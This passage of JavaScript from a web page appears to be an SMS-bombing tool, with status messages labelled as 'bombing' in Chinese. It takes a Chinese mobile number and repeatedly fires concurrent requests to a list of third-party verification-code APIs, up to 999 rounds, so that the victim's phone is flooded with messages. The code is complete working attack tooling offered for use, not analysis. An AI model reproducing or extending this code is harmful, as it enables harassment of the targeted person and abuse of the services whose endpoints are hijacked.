        // 杰同学牛逼
        function convertJsonToApi(urlTemplate) {
            return {
                url: urlTemplate.split('?')[0], // 保留基础URL
                method: 'GET',
                headers: () => ({ 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }),
                data: (phone) => {
                    let finalUrl = urlTemplate.replace(/\[phone\]/g, phone);
                    const queryIndex = finalUrl.indexOf('?');
                    if (queryIndex !== -1) return finalUrl.substring(queryIndex + 1);
                    return '';
                }
            };
        }
        const jsonApis = jsonRawUrls.map(convertJsonToApi);
        
        // 杰同学
        let fullApiList = [...apiRequests, ...jsonApis];
        
        // 全局控制变量
        let isRunning = false;
        let abortController = null;
        let totalSuccess = 0, totalFail = 0;
        const phoneInput = document.getElementById('phone');
        const cycleNumInput = document.getElementById('cycleNum');
        const sendBtn = document.getElementById('sendBtn');
        const stopBtn = document.getElementById('stopBtn');
        const statusWindow = document.getElementById('statusWindow');
        const statusList = document.getElementById('statusList');
        document.getElementById('apiCountSpan') ? document.getElementById('apiCountSpan').innerText = fullApiList.length : null;
        
        function addStatus(desc, isSuccess, msg = '') {
            const item = document.createElement('div');
            item.className = `status-item ${isSuccess ? 'success' : 'error'}`;
            item.innerHTML = `${isSuccess ? '🟢' : '🔴'} ${desc}：${isSuccess ? '轰炸成功' : `轰炸失败 - ${msg}`}`;
            statusList.appendChild(item);
            statusList.scrollTop = statusList.scrollHeight;
        }
        
        async function requestApi(api, phone) {
            const shortUrl = api.url ? (api.url.substring(0, 50) + (api.url.length > 50 ? '...' : '')) : '未知接口';
            try {
                const headers = api.headers ? api.headers() : {};
                let url = api.url;
                let fetchBody = null;
                let fetchUrl = url;
                let fetchHeaders = { ...headers };
                const method = api.method || 'POST';
                let dataRaw = api.data ? api.data(phone, 1) : {};
                
                if (method === 'GET') {
                    let query = '';
                    if (typeof dataRaw === 'string') query = dataRaw;
                    else if (typeof dataRaw === 'object') query = new URLSearchParams(dataRaw).toString();
                    if (query) fetchUrl = url + (url.includes('?') ? '&' : '?') + query;
                } else if (method === 'POST_FORM') {
                    const formData = new URLSearchParams();
                    for (let key in dataRaw) formData.append(key, dataRaw[key]);
                    fetchBody = formData.toString();
                    fetchHeaders['Content-Type'] = fetchHeaders['Content-Type'] || 'application/x-www-form-urlencoded; charset=UTF-8';
                } else {
                    fetchBody = JSON.stringify(dataRaw);
                    fetchHeaders['Content-Type'] = fetchHeaders['Content-Type'] || 'application/json; charset=UTF-8';
                }
                const res = await fetch(fetchUrl, {
                    method: method === 'GET' ? 'GET' : 'POST',
                    headers: fetchHeaders,
                    body: fetchBody,
                    signal: abortController ? abortController.signal : null
                });
                if (res.ok) { addStatus(shortUrl, true); totalSuccess++; }
                else { addStatus(shortUrl, false, `HTTP ${res.status}`); totalFail++; }
            } catch (err) {
                if (err.name === 'AbortError') addStatus(shortUrl, false, '用户停止');
                else addStatus(shortUrl, false, err.message);
                totalFail++;
            }
        }
        
        async function startBatch() {
            const phone = phoneInput.value.trim();
            if (!/^1[3-9]\d{9}$/.test(phone)) { alert('请输入11位中国大陆手机号！'); phoneInput.focus(); return; }
            const cycleNum = parseInt(cycleNumInput.value);
            if (isNaN(cycleNum) || cycleNum < 1 || cycleNum > 999) { alert('请输入1-999之间的循环次数！'); cycleNumInput.focus(); return; }
            isRunning = true;
            abortController = new AbortController();
            totalSuccess = 0; totalFail = 0;
            statusList.innerHTML = '';
            statusWindow.classList.add('show');
            sendBtn.disabled = true;
            stopBtn.disabled = false;
            try {
                for (let round = 1; round <= cycleNum && isRunning; round++) {
                    if (!isRunning) break;
                    addStatus(`===== 第 ${round} 轮 并发开始 (共${fullApiList.length}接口) =====`, true, '');
                    const promises = fullApiList.map(api => requestApi(api, phone));
                    await Promise.allSettled(promises);
                    if (round < cycleNum && isRunning) {
                        addStatus(`===== 第 ${round} 轮 结束，等待0.8秒 =====`, true, '');
                        await new Promise(resolve => setTimeout(resolve, 800));
                    }
                }
                if (isRunning) addStatus(`===== 全部任务完成 =====`, true, `成功:${totalSuccess} 失败:${totalFail}`);
                else addStatus(`===== 已手动停止 =====`, false, `成功:${totalSuccess} 失败:${totalFail}`);
            } catch (err) { addStatus('批量执行异常', false, err.message); }
            finally { isRunning = false; sendBtn.disabled = false; stopBtn.disabled = true; abortController = null; }
        }
        
        function stopBatch() { if (isRunning && abortController) { abortController.abort(); isRunning = false; sendBtn.disabled = false; stopBtn.disabled = true; } }
        phoneInput.addEventListener('input', function(e) { this.value = this.value.replace(/\D/g, '').slice(0, 11); });
        cycleNumInput.addEventListener('input', function(e) { let val = parseInt(this.value); if (isNaN(val)) val = 1; if (val < 1) val = 1; if (val > 999) val = 999; this.value = val; });
    </script>
